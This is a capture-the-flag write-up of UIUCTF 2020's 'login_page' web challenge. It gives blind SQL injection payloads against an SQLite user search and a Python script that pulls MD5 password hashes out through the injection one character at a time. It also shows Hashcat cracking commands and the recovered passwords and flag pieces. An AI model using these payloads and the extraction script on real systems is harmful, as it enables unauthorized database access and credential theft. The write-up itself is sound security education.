---
layout: post
title: "UIUCTF 2020 Writeups"
categories: ctf
---

## Introduction {#intro}
{: style="text-align: center"}

| Challenge Name | Category | Solves | Points |
|:--------------:|:--------:|:------:|:------:|
|[login_page](#login_page) | Web | 23 | 200 |


----------------

## login_page {#login_page}
{: style="text-align: center"}
#### Category: Web | Solves: 23 | Points: 200
{: style="text-align: center"}

----------------

{:refdef: style="text-align: center;"}
![login_page challenge description](https://i.imgur.com/mCYRHDL.png){: .imgCenter}
{: refdef}

The site is rather simple, with only a small login box and a user lookup feature.  Since we're told the site is running SQLite, it's a safe we're looking for something revolving around an injection. We try searching for just the SQLite wildcard "%" (which matches any string of 0 or more characters) and we're presented with a nice list of all the users in the database. 

{:refdef: style="text-align: center;"}
![user list found using sqlite wildcard](https://i.imgur.com/p5ULjCj.png){: .imgCenter}
{: refdef}

From here, we try to log in as Alice and are told we have the wrong password, but also given a password hint. 

{:refdef: style="text-align: center;"}
![login hint for alice](https://i.imgur.com/24imHr2.png){: .imgCenter}
{: refdef}

After playing around with injections for a little while, we find a nested SELECT query which proves to be extremely useful. By querying the `sqlite_master` table we can ask for data from any column in the database, but we can't actually SEE it. When we combine the nested SELECT query with a conditional AND statement, we can start to piece together the contents of those columns.

Through trial and error, we find that there are three basic ways in which the server can respond to our queries: with data, with no data, or with an error. Each of these happens in a different situation and gives us more insight into the structure of the database.

First, since we already know `USERNAME` exists, we use this as a baseline for a known-good query. We see that we get user data back when a specific column exists.
` %" AND username in (SELECT username FROM sqlite_master where username like "%") -- - `

Next we try an obviously non-existent column to establish a baseline response for the negative.  When this is the case, we get the message `ERROR: Something went wrong!`
`%" AND username in (SELECT username FROM sqlite_master where FAKE like "%") -- -`

Using this knowledge we can guess at what the password column must be called, and after a couple tried we find that "password_hash" doesn't throw us any errors.  Now that we know what we're up against, we can switch up our query and use our old wildcard friend to brute-force the key using a query like:
`bob" AND username in (SELECT username FROM sqlite_master where password_hash like "4%") -- -`

This is Python script that will be responsible for doing all of the heavy lifting:

{% highlight python %}
import requests
chars = '1234567890abcdef'                    # list of hex characters
names = ['alice','bob','carl','dania','noob'] # list of usernames

def hashfinder(x, name):                      # we create a function for the repetitive task of brute-forcing
    url = 'https://login.chal.uiuc.tf/search'
    query = {'request' : name+'" AND username in (SELECT username FROM sqlite_master where password_hash like "'+x+'%") -- -'}
    req = requests.post(url, data=query)      # send request with our injection payload
    if 'is '+name in req.text:                # we check for the correct bio (since username also appears in the textbox)
        return(x)                             # and return the character if it's correct

for name in names:                            # for every username
    pwhash=''                                 # we clear the hash and start again
    while len(pwhash) < 32:                   # then, while it's not a full md5 hash
        for y in chars:                       # try to add a character
            if hashfinder(pwhash+y, name):    # to what we already know
                pwhash+=y                     # if it works, we start on the next one
                if len(pwhash) == 32:         # and if we have a full hash
                    print(name +':'+ pwhash)  # we print it with the username
{% endhighlight %}

Which gives us the output of:

| name | hash |
|------|------|
| alice | 530bd2d24bff2d77276c4117dc1fc719 |
| bob | 4106716ae604fba94f1c05318f87e063 |
| carl | 661ded81b6b99758643f19517a468331 |
| dania | 58970d579d25f7288599fcd709b3ded3 |
| noob | 8553127fedf5daacc26f3b677b58a856 |

Now that we have extracted all the hashes, we can get to work trying to crack them using the hints we are given.  Luckily, there is only one hash without a corresponding hint (`8553127fedf5daacc26f3b677b58a856`) and with a simple Google search we find out that the password is `SoccerMom2007`. We use this password to sign in and are given the first part of our flag : `uiuctf{Dump`
Side note: the password/hash combo is on Google because it is in the very popular [RockYou wordlist](https://github.com/praetorian-code/Hob0Rules/blob/master/wordlists/rockyou.txt.gz) that is very commonly used in CTF-like challenges and is even included in Kali Linux (can be found in `/usr/share/wordlists/rockyou.txt.gz`)

The second and third hashes are cracked very quickly with a very basic Hashcat command. It's worth noting that Hashcat has a built in mode for double MD5 (-m 2600), so Bob's password isn't really any harder to crack than Alice's as far as the commands go (although double MD5 is obviously slightly slower to crack.) If you want to learn more about the basics of cracking hashes with Hashcat, you can do so [here](https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/)

Hash number four requires us to build our own wordlist in the format of [Greek God name](https://gist.github.com/sshell/308f3518221d98c16a7b69eb9b209d85#file-gods-txt) + [U.S. State name](https://gist.github.com/sshell/308f3518221d98c16a7b69eb9b209d85#file-states-txt). This can be accomplished by finding these two separate lists on Google, and mixing with a [quick Python script](https://gist.github.com/sshell/308f3518221d98c16a7b69eb9b209d85#file-combine-py). I'm not going to include it here since it's mundane, but you can click the links if you want to see the lists and code behind this task. We found that the password ended up being `DionysusDelaware` and claimed the 4th piece of the flag.

The fifth and final hash is the most interesting one of the bunch.  The password hint is in Arabic and translates to `My favorite animal (6 characters only)` (this was later updated to specify _Arabic_ characters.) We ran it against a few animal wordlists to make sure it wasn't going to be THAT easy before deciding to crack the hash by guessing Arabic characters. This is tricky, but doable running Hashcat with the following arguments:

`hashcat -m 0 -a 3 --hex-charset -1 d8d9dadb -2 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -o output hashes "?1?2?1?2?1?2?1?2?1?2?1?2"`

On this [UTF-8 encoding table,](https://utf8-chartable.de/unicode-utf8-table.pl?start=1536) Arabic letters span 256 characters from `D880` to `DBBF`. We split up these two bytes and create a mask for each, meaning that each single Arabic letter is represented in the mask by a `?1?2` pair. Once we get the rule written, the hash is cracked rather quickly. With the final hash cracked, all we have to do is put together the five pieces of the flag and claim out 200 points!


| name | hint | hash | password | flag |
|------|------|------|----------|------|
| noob | `(none)` | 8553127fedf5daacc26f3b677b58a856 | SoccerMom2007 | `Here's part 0 of the flag: uiuctf{Dump` |
| alice | `My phone number (format: 000-000-0000)` | 530bd2d24bff2d77276c4117dc1fc719 | 704-186-9744 | `Here's part 1 of the flag: _4nd_un` |
| bob | `My favorite 12 digit number (md5 hashed for extra security) [starts with a 10]` | 4106716ae604fba94f1c05318f87e063 | 5809be03c7cc31cdb12237d0bd718898 | `Here's part 2 of the flag: h45h_63` |
| carl | `My favorite Greek God + My least favorite US state (no spaces)` | 661ded81b6b99758643f19517a468331 | DionysusDelaware | `Here's part 3 of the flag: 7_d4t_` |
| dania | `الحيوان المفضل لدي (6 أحرف عربية فقط)` | 58970d579d25f7288599fcd709b3ded3 | طاووسة | `Here's part 4 of the flag: c45h` |

-name: Noob
-hint: (none)
-hash: 8553127fedf5daacc26f3b677b58a856
-pass: SoccerMom2007
-flag: You have successfully logged in! Here's part 0 of the flag: uiuctf{Dump

-name: Alice
-hint: My phone number (format: 000-000-0000) 
-hash: 530bd2d24bff2d77276c4117dc1fc719
-pass: 704-186-9744
-flag: You have successfully logged in! Here's part 1 of the flag: _4nd_un

-name: Bob
-hint: My favorite 12 digit number (md5 hashed for extra security) [starts with a 10] 	
-hash: 4106716ae604fba94f1c05318f87e063
-pass: 5809be03c7cc31cdb12237d0bd718898 (md5 of 102420484096)
-flag: You have successfully logged in! Here's part 2 of the flag: h45h_63

-name: Carl
-hint: My favorite Greek God + My least favorite US state (no spaces)
-hash: 661ded81b6b99758643f19517a468331
-pass: DionysusDelaware
-flag: You have successfully logged in! Here's part 3 of the flag: 7_d4t_

-name: Dania
-hint: الحيوان المفضل لدي (6 أحرف عربية فقط)  (Translated : `My favorite animal (6 Arabic characters only)`)
-hash: 58970d579d25f7288599fcd709b3ded3
-pass: طاووسة
-flag: You have successfully logged in! Here's part 4 of the flag: c45h}


----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------
